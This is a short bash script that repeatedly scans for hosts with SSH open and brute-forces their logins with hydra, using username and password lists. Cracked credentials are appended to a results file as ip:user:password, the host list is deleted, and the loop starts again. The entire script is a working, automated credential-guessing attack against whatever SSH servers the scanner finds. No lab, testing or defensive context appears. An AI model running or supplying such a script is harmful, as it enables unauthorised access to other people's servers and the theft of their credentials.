while true; do
    python3 emap-ssh.py 22 120 ips.txt 4

    while read -r ip; do
        [ -z "$ip" ] && continue

        echo "[*] Attacking $ip"

        hydra -L users.txt -P passwords.txt ssh://"$ip" -t 4 -f -I 2>/dev/null \
        | grep "login:" \
        | awk -v ip="$ip" '{print ip ":" $5 ":" $7}' \
        >> results.txt

    done < ips.txt

    rm -f ips.txt
    sleep 10
done
